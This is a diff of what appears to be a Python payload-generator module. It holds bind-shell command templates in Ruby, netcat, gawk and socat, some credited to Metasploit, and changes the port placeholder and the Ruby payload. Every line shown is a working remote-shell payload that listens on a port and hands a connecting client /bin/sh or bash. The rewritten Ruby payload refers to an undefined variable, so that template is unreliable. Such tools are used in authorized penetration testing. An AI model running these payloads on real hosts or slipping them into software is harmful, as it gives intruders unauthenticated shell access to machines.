@@ -27,7 +27,7 @@ def BIND_PHP_UDP():
 
 
 def BIND_RUBY_TCP():
-    return """ruby -rsocket -e 'VAR1=TCPServer.new(PORT);VAR2=VAR1.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",VAR2,VAR2,VAR2)'"""
+    return """ruby -rsocket -e 'VAR1=TCPServer.new(PORT);VAR2=VAR1.accept;VAR1.close();$stdin.reopen(VAR2);$stdout.reopen(VAR2);$stderr.reopen(VAR2);$stdin.each_line{|VAR3|VAR3=VAR3.strip;next if VAR3.length==0;(IO.popen(VAR3,"rb"){|VAR4|VAR4.each_line{|VAR5|c.puts(VAR5.strip)}})rescue nil}'"""
 
 
 def BIND_RUBY_UDP():
@@ -35,15 +35,15 @@ def BIND_RUBY_UDP():
 
 
 def BIND_NETCAT_TCP():
-    return """rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc -lvp $((PORT)) >/tmp/VAR1"""
+    return """rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/VAR1"""
 
 
 def BIND_NETCAT_OPENBSD_UDP():
-    return """coproc nc -luvp $((PORT)); exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
+    return """coproc nc -luvp PORT; exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
 
 
 def BIND_NETCAT_TRADITIONAL_TCP():
-    return """nc -lvp $((PORT)) -c /bin/bash"""
+    return """nc -lvp PORT -c /bin/bash"""
 
 
 def BIND_POWERSHELL_TCP():
@@ -53,13 +53,13 @@ def BIND_POWERSHELL_TCP():
 # Removed from MetasploitFramework
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_awk.rb
 def BIND_AWK_TCP():
-    return """VAR1=$((PORT));awk -v VAR2="$VAR1" 'BEGIN{VAR3=\"/inet/tcp/"VAR2"/0/0\";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'"""
+    return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3=\"/inet/tcp/"VAR2"/0/0\";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'"""
 
 
 # Removed from MetasploitFramework
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_socat_udp.rb
 def BIND_SOCAT_UDP():
-    return "socat udp-listen:$((PORT)) exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
+    return "socat udp-listen:PORT exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
 
 
 def BIND_POWERSHELL_NISHANG_TCP():
